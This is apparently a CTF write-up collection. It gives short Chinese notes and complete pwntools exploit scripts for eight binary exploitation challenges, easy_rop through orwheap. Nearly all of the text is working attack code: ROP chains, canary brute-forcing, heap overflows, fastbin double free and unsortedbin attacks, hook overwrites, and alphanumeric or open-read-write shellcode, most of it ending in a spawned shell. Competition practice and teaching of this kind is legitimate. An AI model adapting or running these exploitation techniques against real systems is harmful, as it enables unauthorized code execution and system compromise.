# easy_rop

```python
from pwn import *

context.arch = "amd64"

def main(host,port=10041):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./easy_rop",env={"LD_PRELOAD":"./libc6-i386_2.23-0ubuntu10_amd64.so"})
		gdb.attach(p,"b *0x8048590")
	p.recvuntil("Hello CTFer!")
	p.send("A"*0x20+p32(0x66666666))
	p.recvuntil("name?")
	p.send("A"*0x14+p32(elf.symbols["puts"])+p32(0x8048592)+p32(elf.got["read"]))
	p.recv()
	libc.address = u32(p.recv(4))-libc.symbols["read"]
	info("libc: " + hex(libc.address))
	# 0x080483b5 : pop ebx ; ret
	p.recvuntil("Hello CTFer!")
	p.send("A"*0x20+p32(0x66666666))
	p.recvuntil("name?")
	p.send("A"*0x14+p32(0x080483b5)+p32(0)+p32(libc.symbols["system"])+p32(0x8048592)+p32(libc.search("/bin/sh\x00").next()))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so",checksec=False)
	elf = ELF("./easy_rop",checksec=False)
	main(args['REMOTE'])
```

# easy_shellcode

用Alpha3偷了个懒

```python
from pwn import *

context.arch = "amd64"

def main(host,port=10080):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		gdb.attach(p,"b *0x000000000400CA3")
	# sc = asm('''
		# push rcx
		# pop rsi
		# xor rdi,rdi
		# xor rdx,rdx
		# xor dl,0xff
		# xor rax,rax
		# syscall
	# ''')
	# f = open("shellcode","wb")
	# f.write(sc)
	# f.close()
	shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M7L0i14114V0y153s4q3V390x0H3a2Z060s"
	p.recvuntil("to say?")
	p.send(shellcode)
	pause()
	sc = "\x90"*0x4f
	sc += asm(shellcraft.sh())
	p.send(sc.ljust(0xff,"\x90"))
	p.interactive()
	
if __name__ == "__main__":
	# libc = ELF("./libc.so.6",checksec=False)
	# elf = ELF("./easystack",checksec=False)
	main(args['REMOTE'])
```

# easy_stack

一位一位爆`canary`

```python
from pwn import *

def leak_canary():
	canary = 0
	for i in range(3):
		p.recvuntil("want to calc: ")
		p.sendline("301")
		for j in range(0xff,0,-1):
			p.recvuntil("num?(Input 0 to stop): ")
			p.sendline(str(canary | (j << ((3-i)*8))))
		p.sendline(str(0))
		p.recvuntil("answer is ")
		answer = int(p.recvuntil('\n',drop=True))
		canary = canary | (44115-answer) << ((3-i)*8)
		info(hex(canary))
		p.sendlineafter("Do you want to exit?(y or n)","n")
	return canary
def main(host,port=10036):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./easystack")
		gdb.attach(p,"b *0x8048ACB")
		# debug(0x0000000000000A69)
	canary = leak_canary()
	info(hex(canary))
	p.recvuntil("want to calc: ")
	p.sendline("400")
	for i in range(300):
		p.recvuntil("num?(Input 0 to stop): ")
		p.sendline(str(0xcafebabe))
	payload = [canary,0xcafebabe,0xcafebabe,0xcafebabe,0x8048750,
		0x8048B0F,0x0804A0C0,elf.got["__libc_start_main"],
		0
	]
	for i in payload:
		p.recvuntil("num?(Input 0 to stop): ")
		p.sendline(str(i))
	p.sendlineafter("Do you want to exit?(y or n)","n")
	p.recv()
	libc.address = u32(p.recv(4))-libc.symbols["__libc_start_main"]
	info("libc : " + hex(libc.address))

	payload = [canary,0xcafebabe,0xcafebabe,0xcafebabe,
		libc.symbols["system"],0xdeadbeef,libc.search("/bin/sh\x00").next(),
		0
	]
	p.recvuntil("want to calc: ")
	p.sendline("400")
	for i in range(300):
		p.recvuntil("num?(Input 0 to stop): ")
		p.sendline(str(0xcafebabe))
	for i in payload:
		p.recvuntil("num?(Input 0 to stop): ")
		p.sendline(str(i))
	p.sendlineafter("Do you want to exit?(y or n)","n")
	p.interactive()
	
if __name__ == "__main__":
	# libc = ELF("./libc.so.6",checksec=False)
	libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so",checksec=False)
	elf = ELF("./easystack",checksec=False)
	main(args['REMOTE'])
```

# baby_heap

第一次泄露，第二次`getshell`

```python
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("choice: ")
	p.sendline(str(command))
def add(content):
	cmd(1)
	p.recvuntil("content: ")
	p.send(content)
def show(idx):
	cmd(3)
	p.sendlineafter("index: ",str(idx))
def dele(idx):
	cmd(4)
	p.sendlineafter("index: ",str(idx))
def edit(idx,sz,content):
	cmd(2)
	p.sendlineafter("index: ",str(idx))
	p.sendlineafter("size: ",str(sz))
	p.recvuntil("content: ")
	p.send(content)

def main(host,port=10052):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./babyheap")
		# p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
		gdb.attach(p,"b *0x0000000000400A5F")
		# debug(0x0000000000000A69)
	add("A")
	add("B")
	payload = "\x00"*0x18+p64(elf.symbols["puts"])+p64(0)+p64(0x31)+"A"*0x18
	edit(0,len(payload),payload)
	show(1)
	p.recvuntil("A"*0x18)
	libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,b"\x00"))-libc.symbols["puts"]
	success('libc : '+hex(libc.address))
	payload = "/bin/sh\x00"+"\x00"*0x10+p64(libc.symbols["system"])
	edit(0,len(payload),payload)
	show(0)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# libc = ELF("./x64_libc.so.6",checksec=False)
	elf = ELF("./babyheap",checksec=False)
	main(args['REMOTE'])
```

# sosoeasy_pwn

原先没看到有后门函数

```python
from pwn import *

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))


def main(host,port=10000):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		# gdb.attach(p,"b *0x8048ACB")
		debug(0x00000000000009E6)
	p.recvuntil("Welcome our the ")
	high = int(p.recvuntil(" ",drop=True))
	# guess = int(raw_input("guess : "))
	guess = 0xe
	system = (high << 16) | ((guess << 12) | 0x9cd)
	p.recvuntil("me your name?")
	p.send("A"*4+"/bin/sh\x00"+p32(system))
	p.recvuntil("(1.hello|2.byebye):")
	p.send("3")
	p.interactive()
	
if __name__ == "__main__":
	main(args['REMOTE'])
```

# Box

`edit`函数没检查负数的`idx`，可以用来泄露`libc`，然后用`realloc`来`double free`

```python
from pwn import *

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("Your Choice: ")
	p.sendline(str(command))
def add(idx,sz):
	cmd(1)
	p.sendlineafter("ID: ",str(idx))
	p.recvuntil("Size: ")
	p.sendline(str(sz))
def edit(idx,content):
	cmd(2)
	p.sendlineafter("ID: ",str(idx))
	p.recvuntil("Content: ")
	p.send(content)
def dele(idx):
	cmd(3)
	p.sendlineafter("ID: ",str(idx))
	
def main(host,port=10035):
	global p
	if host:
		p = remote(host,port)
	else:
		# p = process("./Box")
		p = process("./Box",env={"LD_PRELOAD":"./x64_libc.so.6"})
		# gdb.attach(p)
		debug(0x0000000000000E42)
	edit(-12,p64(0xfbad1800)+p64(0)*3+'\x00')
	p.recv(0x40)
	libc.address = u64(p.recv(8)) - 0x3c5600
	info("libc : " + hex(libc.address))
	if(libc.address > 0x800000000000):
		print "unluck :("
		return
	add(0,0x68)
	add(1,0x68)
	dele(0)
	add(1,0)
	add(0,0)
	add(0,0x68)
	edit(0,p64(libc.symbols["__malloc_hook"]-0x23))
	add(1,0x68)
	add(2,0x68)
	
	add(3,0x68)
	edit(3,"\x00"*0xb+p64(libc.symbols["malloc"]+2)+p64(libc.address+0xf02a4))
	add(0,0)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./x64_libc.so.6",checksec=False)
	main(args['REMOTE'])
```

# driver

`heap fengshui`

`edit`函数有一次的`off by one`的机会，我拿来构造`overlap chunk`了，然后用`unsortedbin attack`修改了`license`的值，这样就可以根据`name`指针来任意写了

```python
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("Choice>> ")
	p.sendline(str(command))
def add(car,name):
	cmd(1)
	p.recvuntil("Choice>> ")
	p.sendline(str(car))
	p.recvuntil("name: ")
	p.send(name)
def show():
	cmd(2)
def dele(idx):
	cmd(3)
	p.sendlineafter("index: ",str(idx))
def edit(idx,name):
	cmd(4)
	p.sendlineafter("index: ",str(idx))
	p.recvuntil("name: ")
	p.send(name)
def driver(idx,op):
	cmd(5)
	p.sendlineafter("index: ",str(idx))
	cmd(op)
def main(host,port=10015):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn")
		# p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
		gdb.attach(p)
		# debug(0x0000000000000A69)
	cmd(8)
	p.recvuntil("gift: ")
	heap = int(p.recvuntil('\n',drop=True),16) - 0x10
	info("heap : " + hex(heap))
	
	add(3,'0')	#0
	add(1,'1')	#1
	dele(0)
	add(2,'0')	#0
	add(3,(p64(0)+p64(0x31))*0x21)	#2
	driver(2,2)
	p.recvuntil("Car's Speed is ")
	libc.address = int(p.recvuntil('Km',drop=True),10)*2 - 0x3c4b78 
	info("libc : " + hex(libc.address))
	dele(0)
	edit(1,"\x00"*0x60+p64(0x2e0))
	dele(2)
	payload = "\x00"*0xf8+p64(0x41)
	payload += p64(0)*3+p64(0x220)
	payload += p64(0)+p64(heap+0x250)
	payload += "\x00"*8+p64(0x21)
	payload += "\x00"*0x98+p64(0x71)
	add(3,payload)
	dele(0)
	payload = "\x00"*0x48+p64(0x231)
	payload += p64(0) + p64(heap)
	add(1,payload)
	payload = "/bin/sh\x00"+"\x00"*0x10+p64(0x10)
	payload += p64(0)+p64(libc.symbols["__free_hook"])
	add(3,payload)
	cmd(6)
	p.sendlineafter("index: ",str(1))
	p.recvuntil("name: ")
	p.send(p64(libc.symbols["system"]))
	dele(1)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	# libc = ELF("./x64_libc.so.6",checksec=False)
	# elf = ELF("./pwn",checksec=False)
	main(args['REMOTE'])
```

# orwheap

`heap fengshui`

3个`chunk`,禁用了`execve`，听题目意思就是要`orw`了，所以就`orw`吧

原先一直想劫持`__free_hook`，但是不太行。（我太菜了

最后是把栈地址返回，然后用`edit`来进行`rop`，然后执行`shellcode`

```c
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("Your Choice: ")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("size: ")
	p.sendline(str(sz))
	p.recvuntil("content: ")
	p.send(content)
def edit(idx,content):
	cmd(3)
	p.sendlineafter("idx: ",str(idx))
	p.recvuntil("content: ")
	p.send(content)
def dele(idx):
	cmd(2)
	p.sendlineafter("idx: ",str(idx))
	
def main(host,port=10005):
	global p
	if host:
		p = remote(host,port)
	else:
		# p = process("./pwn")
		p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
		gdb.attach(p)
		# debug(0x0000000000000A69)
	add(0x68,'\n')	#0
	add(0x68,'\n')	#1
	add(0x68,'\n')	#2
	add(0x118,(p64(0)+p64(0x21))*0x11+'\n')	#3
	dele(0)
	add(0x68,"A"*0x68+'\xe1')	#0
	dele(1)
	add(0x68,'\n')	#1
	add(0x68,'\n')	#4
	dele(0)
	dele(2)
	edit(4,'\x70')
	
	stdout = int(raw_input("guess: "))
	stdout = (stdout << 12) | 0x620
	# stdout = 0x9620
	edit(1,p16(stdout-0x43))
	add(0x68,"A\n")	#0
	add(0x68,"A\n")	#2
	
	add(0x68,"A\n")	#5
	edit(5,"\x00"*0x33+p64(0xfbad1800)+p64(0)*3+p16(stdout-0x1000))
	
	p.recv(0x560)
	heap = u64(p.recv(8)) - 0xe0
	info("heap : " + hex(heap))

	libc.address = u64(p.recv(8)) - 0x3c4b78
	info("libc : " + hex(libc.address))
	dele(3)
	dele(1)
	
	edit(2,p64(libc.symbols["__malloc_hook"]-0x23))
	
	add(0x68,p64(0)+'\n')
	add(0x68,"\x00"*0xb+p64(libc.address+0x000000000009ed80)+p64(libc.symbols["__libc_realloc"]+0x10)+'\n')
	
	dele(1)
	
	p.recvuntil("Your Choice: ")
	p.send("1\x00"+"\x00"*6+p64(heap))
	p.recvuntil("size: ")
	p.send("1000\x00"+"\x00"*3+p64(libc.address+0x000000000002024f))
	# 0x0000000000021102: pop rdi; ret;
	# 0x00000000001150c9: pop rdx; pop rsi; ret; 
	p_rdi = libc.address+0x21102
	p_rdx_rdi = libc.address+0x1150c9
	p.recvuntil("Please input content: ")
	payload = "A"*8+flat([p_rdi,0,p_rdx_rdi,0x200,heap,libc.symbols["read"]])
	payload += flat([p_rdi,heap,p_rdx_rdi,7,0x1000,libc.symbols["mprotect"]])
	payload += flat([p_rdi,0,heap])
	p.sendline(payload)
	pause()

	sc = asm(shellcraft.open('/',0x10000))
	# ls / to find flag
	sc += asm('''
		push rax
		pop rdi
		and cl,0
		add rcx,0x100
		push rcx
		pop rsi
		mov rdx,0x400
		push 78
		pop rax
		syscall
		xor rdi,rdi
		inc rdi
		push rdi
		pop rax
		syscall
	''')
	p.send('\x90'*0x10+sc)
	# p.send('\x90'*0x10+asm(shellcraft.cat('/flag')))
	p.interactive()
	
if __name__ == "__main__":
	# libc = ELF("./libc.so.6",checksec=False)
	libc = ELF("./x64_libc.so.6",checksec=False)
	# elf = ELF("./pwn",checksec=False)
	main(args['REMOTE'])
```

